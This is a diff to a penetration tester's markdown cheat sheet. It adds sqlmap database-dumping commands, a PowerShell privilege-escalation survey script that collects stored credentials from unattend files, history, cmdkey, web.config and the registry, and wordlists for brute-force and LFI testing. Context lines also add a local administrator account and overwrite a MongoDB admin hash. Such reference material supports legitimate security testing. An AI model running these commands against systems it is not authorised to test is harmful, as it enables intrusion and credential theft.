+| `... WHERE column = value;`               | Equal to.                                                       | `WHERE id = 5;`                                                 |
+| `... WHERE column != value;`              | Not equal to.                                                   | `WHERE category != 'Hacking';`                                  |
+| `... WHERE column > value;`               | Greater than.                                                   | `WHERE published_date > '2020-01-01';`                          |
+| `... WHERE column < value;`               | Less than.                                                      | `WHERE price < 50;`                                             |
+| `... WHERE column >= value;`              | Greater than or equal to.                                       | `WHERE price >= 100;`                                           |
+| `... WHERE column <= value;`              | Less than or equal to.                                          | `WHERE price <= 25;`                                            |
+| **FUNCTIONS**                             |                                                                 |                                                                 |
+| `CONCAT(str1, str2, ...);`                | Combines two or more strings into one.                          | `SELECT CONCAT(name, ' - ', category) FROM books;`              |
+| `GROUP_CONCAT(column);`                   | Concatenates data from multiple rows into one string.           | `SELECT GROUP_CONCAT(name) FROM books;`                         |
+| `SUBSTRING(string, start, length);`       | Extracts a substring from a string.                             | `SELECT SUBSTRING(published_date, 1, 4) FROM books;`            |
+| `LENGTH(string);`                         | Returns the length of a string in characters.                   | `SELECT name, LENGTH(name) FROM books;`                         |
+| `COUNT(column);`                          | Returns the number of rows.                                     | `SELECT COUNT(*) FROM books;`                                   |
+| `SUM(column);`                            | Returns the total sum of a numeric column.                      | `SELECT SUM(price) FROM books;`                                 |
+| `MAX(column);`                            | Returns the largest value in a column.                          | `SELECT MAX(price) FROM books;`                                 |
+| `MIN(column);`                            | Returns the smallest value in a column.                         | `SELECT MIN(price) FROM books;`                                 |
+
+### 🐬 MySQL / MariaDB
+
+```bash
+# Enhanced nmap scan for MySQL service
+nmap -Pn -sV -p 3306 -A <IP_ADDRESS>  # Better service enumeration
+
+# Connect to MySQL/MariaDB with mycli (enhanced MySQL client)
+mycli -u root -h <IP_ADDRESS>
+
+# MariaDB-specific commands:
+SHOW databases;
+USE <DATABASE>;
+SHOW tables;
+SELECT * FROM <TABLE>;
+```
+
+### 🔍 sqlmap
+
+| Command                               | Description                                                                                                                                                                                   |
+| :------------------------------------ | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `sqlmap --wizard`                     | Starts an interactive, step-by-step wizard that guides you through setting up a scan. Ideal for beginners.                                                                                    |
+| `sqlmap -r post_request.txt`          | Reads a raw HTTP request from a file (e.g., saved from Burp Suite) and automatically parses it to test for vulnerabilities. Essential for testing POST requests and complex web applications. |
+| `sqlmap --batch -u '<URL>'`           | Runs a non-interactive scan on a target URL, accepting default answers for all questions. This is the starting point for most scans.                                                          |
+| `... --dbs`                           | Enumerates (lists) all the databases that the current user can access on the server.                                                                                                          |
+| `... -D <DATABASE> --tables`          | After identifying a database, this command lists all the tables within that specific database.                                                                                                |
+| `... -D <DATABASE> -T <TABLE> --dump` | Dumps (extracts) all the data from a specific table within a specific database. This is the final step to retrieve the data.                                                                  |
+
+### 💾 MongoDB
+
 ```bash
 # Connect to a MongoDB instance on a specific port
 mongo --port 27117
@@ -1146,21 +1668,27 @@ openssl passwd -6 <PASSWORD>
 db.admin.update({ "name" : "administrator" }, { $set: { "x_shadow" : "<HASH>" } });
 ```
 
-
-## RDP via xfreerdp
+## 🖥️ RDP via xfreerdp
 
 ```bash
 xfreerdp3 /clipboard /dynamic-resolution /cert:ignore /v:<TARGET> /u:<USER> /p:'<PASSWORD>'
 ```
 
-## Linux Commands
+## 🐧 Linux Commands
 
-### `strings` in Python
+### 🐍 `strings` in Python
 
 ```bash
 python3 -c "import re, sys; [print(m.decode()) for m in re.findall(b'[ -~]{4,}', open(sys.argv[1], 'rb').read())]" <FILE>
 ```
-## Windows Commands
+
+### 🔤 `strings` w/ different Encodings
+
+```bash
+FILE="FILENAME" ; ( strings -S "$FILE" ; strings -l "$FILE" ; strings -b "$FILE" ) | sort -u
+```
+
+## 🪟 Windows Commands
 
 ```powershell
 # Survey
@@ -1188,7 +1716,7 @@ net user <USERNAME> <PASSWORD> /add
 net localgroup administrators <USERNAME> /add
 ```
 
-## PowerShell
+### 💻 PowerShell
 
 ```powershell
 ###
@@ -1225,11 +1753,161 @@ Get-NetTCPConnection
 Get-FileHash
 Invoke-Command
 Invoke-Command -ComputerName Server01 -Credential Domain01\User01 -ScriptBlock { Get-Culture }
+
+# Active Directory
+# Quick-open DC Admin Console
+WIN + R
+dsa.msc
+
+# Group Policy Management Console 
+WIN + R
+gpmc.msc
+
+# Update and apply GPOs to computers
+# syncs via the share SYSVOL at C:\Windows\SYSVOL\sysvol\
+gpupdate /force
+
+# Change password
+Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
+
+# Force new password for user on login
+Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose
+```
+
+### Windows Survey for PrivEsc (MSDOS)
+
+```bash
+search flag dir /b/s *flag.txt  
+whoami /priv          
+query user                 # use it to see if anyother user is currently logged in 
+net users     # list all the users
+net user administrator     # Detailed info about the user 
+net localgroup        # to list all the groups 
+net localgroup administrators
+ipconfig /all
+arp -a    # to see other connected devices
+netstat -ano  # print open ports used by services running on the system
+```
+### Windows Survey for PrivEsc (PowerShell)
+
+```powershell
+# ===============================================================
+# ===       WINDOWS PRIVILEGE ESCALATION SURVEY SCRIPT        ===
+# ===============================================================
+#
+#  Purpose: Quickly identify Tier 1 & Tier 2 privilege escalation
+#           vectors using built-in Windows commands.
+#  Usage:
+#    1. Transfer this script to the target machine.
+#    2. Open a PowerShell prompt.
+#    3. Run: Set-ExecutionPolicy Bypass -Scope Process -Force
+#    4. Run: . .\windows_survey.ps1
+#
+#################################################################
+
+# --- Start logging all output to a file ---
+$outputFile = "C:\Windows\Temp\windows_survey_output.txt"
+Start-Transcript -Path $outputFile
+
+# --- Main Survey Execution ---
+
+Write-Host "===============================================================" -ForegroundColor Cyan
+Write-Host "===        WINDOWS PRIVILEGE ESCALATION SURVEY SCRIPT       ===" -ForegroundColor Cyan
+Write-Host "===============================================================" -ForegroundColor Cyan
+
+Write-Host "`n===== WHO AM I? & SYSTEM INFO =====" -ForegroundColor Green
+Write-Host "--- Current User & Groups ---"
+whoami /all
+Write-Host "`n--- System Information ---"
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+
+Write-Host "`n===== [CRITICAL] WINDOWS PRIVILEGES (whoami /priv) =====" -ForegroundColor Yellow
+Write-Host "Look for SeImpersonate, SeAssignPrimaryToken, SeBackup, SeTakeOwnership, SeLoadDriver"
+whoami /priv
+
+Write-Host "`n===== [TIER 1] CREDENTIALS & SENSITIVE FILES =====" -ForegroundColor Green
+Write-Host "--- Common Unattend/Sysprep Files ---"
+$unattendFiles = @("C:\Unattend.xml", "C:\Windows\Panther\Unattend.xml", "C:\Windows\system32\sysprep.inf", "C:\Windows\system32\sysprep\sysprep.xml")
+foreach ($file in $unattendFiles) {
+    if (Test-Path $file) { Get-Content $file }
+}
+
+Write-Host "`n--- PowerShell History File ---"
+try {
+    Get-Content (Get-PSReadlineOption).HistorySavePath
+} catch {
+    Write-Host "PSReadline history not found."
+}
+
+Write-Host "`n--- Saved Credentials (cmdkey) ---"
+cmdkey /list
+
+Write-Host "`n--- Common Application Config Files (web.config) ---"
+Get-ChildItem -Path C:\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object { Get-Content $_.FullName | findstr "connectionString" }
+
+Write-Host "`n--- Common Registry Password Locations ---"
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "ProxyPassword" /s 2>$null
+reg query HKEY_CURRENT_USER\Software\ORL\WinVNC3\Password /s 2>$null
+
+Write-Host "`n===== [TIER 1] SERVICE MISCONFIGURATIONS =====" -ForegroundColor Green
+Write-Host "--- Unquoted Service Paths (potential for hijacking) ---"
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /v "`""
+
+Write-Host "`n--- Services with Writable Binaries/Folders ---"
+Write-Host "Manually check permissions on these paths with 'icacls'"
+# Get all services NOT running from C:\Windows, then check permissions on their binaries
+$services = Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notlike "C:\Windows*" -and $_.PathName }
+foreach ($service in $services) {
+    $path = $service.PathName.Trim('"')
+    if (Test-Path $path) {
+        Write-Host "`nService: $($service.Name)"
+        Write-Host "Binary Path: $path"
+        icacls $path
+    }
+}
+
+Write-Host "`n===== [TIER 2] SCHEDULED TASK MISCONFIGURATIONS =====" -ForegroundColor Green
+Write-Host "Checking for tasks running with high privileges and checking permissions on the executables..."
+$tasks = schtasks /query /fo list /v
+$taskPath = ""
+foreach ($line in ($tasks -split "`n")) {
+    if ($line -match "Run As User:\s+(NT AUTHORITY\\SYSTEM|Administrators)") {
+        Write-Host "`n[+] High-Privilege Task Found:" -ForegroundColor Yellow
+        Write-Host $line.Trim()
+    }
+    if ($line -match "Task To Run:\s+(.*)") {
+        $taskPath = $matches[1].Trim()
+        if ($taskPath -ne "N/A" -and (Test-Path $taskPath)) {
+            Write-Host "--- Permissions for Task Binary: $taskPath ---"
+            icacls $taskPath
+        }
+    }
+}
+
+Write-Host "`n===== [TIER 1] REGISTRY QUICK WINS =====" -ForegroundColor Green
+Write-Host "--- AlwaysInstallElevated ---"
+$key1 = reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null
+$key2 = reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null
+if ($key1 -and $key2) {
+    Write-Host "[!!!] VULNERABLE: AlwaysInstallElevated is set in both HKLM and HKCU!" -ForegroundColor Red
+    $key1
+    $key2
+} else {
+    Write-Host "[-] AlwaysInstallElevated not configured."
+}
+
+Write-Host "`n===== SURVEY COMPLETE =====" -ForegroundColor Cyan
+Write-Host "Results saved to: $outputFile" -ForegroundColor Cyan
+
+# --- Stop logging ---
+Stop-Transcript
 ```
 
 ## 🌱 Living Off the Land
 
 Ref: https://lolbas-project.github.io/#
+
+## 📁 Files
 
 ## 📍 Good Locations
 
@@ -1283,13 +1961,26 @@ Ref: https://lolbas-project.github.io/#
 | taskmgr | Task Manager | Monitor system processes and performance |
 | WF.msc | Windows Defender Firewall | Configure advanced firewall settings |
 
+### 📋 Windows Event Logs
+
+| Event ID | Description                                         |
+| :------- | :-------------------------------------------------- |
+| **4624** | A user account successfully logged in.              |
+| **4625** | A user account failed to log in.                    |
+| **4634** | A user account successfully logged off.             |
+| **4720** | A user account was created.                         |
+| **4724** | An attempt was made to reset an account’s password. |
+| **4722** | A user account was enabled.                         |
+| **4725** | A user account was disabled.                        |
+| **4726** | A user account was deleted.                         |
+
 # 📚 Resources
 
 ## ⚙️ Prep Commands
 
 ```bash
 # Add HOST for local DNS resolution in /etc/hosts file
-echo '<TARGET_IP> <TARGET_HOST>' | sudo tee -a /etc/hosts
+echo '<TARGET> <TARGET_HOST>' | sudo tee -a /etc/hosts
 ```
 
 ## 🎯 EZ Wins & Searching Info
@@ -1303,6 +1994,9 @@ ltrace <EXE_FILE>
 
 # Stegohide
 steghide info <FILE>
+
+# PDFs
+pdfinfo <PDF_FILE>
 
 # EXIF data
 exiftool -a -G <FILE>
@@ -1347,30 +2041,50 @@ echo "    deactivate"
 
 ## 📝 Wordlists
 
-### 🌐 Web Directory & File Enumeration (Gobuster, ffuf)
-*   **Best All-Around:** `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`
-*   **Fastest:** `/usr/share/seclists/Discovery/Web-Content/common.txt`
-*   **Most Thorough:** `/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt`
+### 🌐 Web Directory Enumeration (Gobuster, ffuf)
+*   **Find Hidden Admin Pages:** `/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt`
+    *   High-quality list specifically curated for finding common directory names
+*   **Fast Recon:** `/usr/share/seclists/Discovery/Web-Content/common.txt`
+*   **Comprehensive:** `/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt`
 
-### 🔓 Password Cracking & Brute-Forcing (Hydra, John, Hashcat)
-*   **Primary (Must-Use):** `/usr/share/wordlists/rockyou.txt`
+### 📄 Web File Enumeration (ffuf)
+*   **Find Hidden Files (.php, .bak, etc.):** `/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt`
+    *   Curated for finding common file names and extensions
+
+### 🔓 Password Attacks
+#### Online Brute-Force (Hydra, ffuf)
+*   **Web Logins & SSH/FTP:** `/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt`
+    *   **Why:** Small, fast, high-probability. Avoids account lockouts
+    *   **Use for:** Web login forms, SSH, FTP, and other online attacks
+
+#### Offline Hash Cracking (John, Hashcat)
+*   **Primary:** `/usr/share/wordlists/rockyou.txt`
     *   **Note:** Decompress first with `sudo gzip -d /usr/share/wordlists/rockyou.txt.gz`
+    *   **Why:** Massive and comprehensive. Perfect for offline cracking where speed isn't network-limited
 
 ### 🌐 Subdomain Enumeration (ffuf, gobuster vhost)
 *   **Best All-Around:** `/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt`
-*   **Fastest:** `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
+*   **Fast Recon:** `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
 
 ### 👤 Username Enumeration
+*   **Common Names:** `/usr/share/seclists/Usernames/Names/names.txt`
 *   **General Shortlist:** `/usr/share/seclists/Usernames/top-usernames-shortlist.txt`
 *   **Default Credentials:** `/usr/share/seclists/Usernames/cirt-default-usernames.txt`
-*   **Common Names:** `/usr/share/seclists/Usernames/Names/names.txt`
 
-## Report Templates
+### 🔍 Parameter Enumeration (ffuf)
+*   **Find Hidden GET Parameters:** `/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt`
+    *   Common parameter names (id, user, page, debug, etc.)
+
+### 🎯 LFI Vulnerability Testing (ffuf, Burp Intruder)
+*   **LFI Payloads:** `/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt`
+    *   Contains LFI payloads (../../, ....//, etc.), not just words
+
+## 📄 Report Templates
 
 - [Cybersecurity Style Guide V1.1 - Bishop-Fox-Cybersecurity-Style-Guide.pdf](https://s3.us-east-2.amazonaws.com/s3.bishopfox.com/prod-1437/Documents/Guides/Bishop-Fox-Cybersecurity-Style-Guide.pdf)
 - [Ghostwriter: The SpecterOps project management and reporting engine](https://github.com/GhostManager/Ghostwriter)
 
-# 🛠️ **The Docs**
+## 🛠️ **The Docs**
 
 ## ⚙️ Ansible
 
